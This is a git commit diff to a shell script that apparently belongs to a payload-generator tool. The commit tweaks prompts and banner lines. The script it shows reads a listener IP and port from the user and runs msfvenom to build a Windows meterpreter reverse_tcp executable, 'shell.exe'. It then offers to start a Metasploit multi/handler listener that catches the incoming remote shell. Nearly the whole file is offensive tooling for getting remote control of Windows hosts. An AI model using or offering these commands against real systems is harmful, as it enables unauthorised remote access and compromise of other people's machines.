bd49bb9290f7c58b1dfc288e5373b3ed4877528d
gnsrikanth <nagasrikanthgrandhi@gmail.com>
2017-02-06 06:33:49 +0000

    Update windows_reverse_tcp.sh

--- payloads/windows_reverse_tcp.sh
+++ payloads/windows_reverse_tcp.sh
@@ -1,11 +1,14 @@
-echo "enter Listiner IP"
+echo "Enter Listiner IP:"
 read ip
-echo "Enter Listiner PORT"
+echo "Enter Listiner PORT:"
 read port
 cd ..
 cd output
+echo "please wait"
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe
+echo "**********************************"
 echo "shell.exe created in output folder"
+echo "**********************************"
 cd ..
 #TO START THE HANDLER
 echo "Do you want to start listner now?(1 for Yes/ 2 for No)"
@@ -15,6 +18,6 @@ case $op in
 	msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; run" ;; 
 	2)
 	bash easypayload.sh ;;
-	*)echo "Wrong option! "
+	*)echo "Wrong option!"
 	bash easypayload.sh ;;
 esac
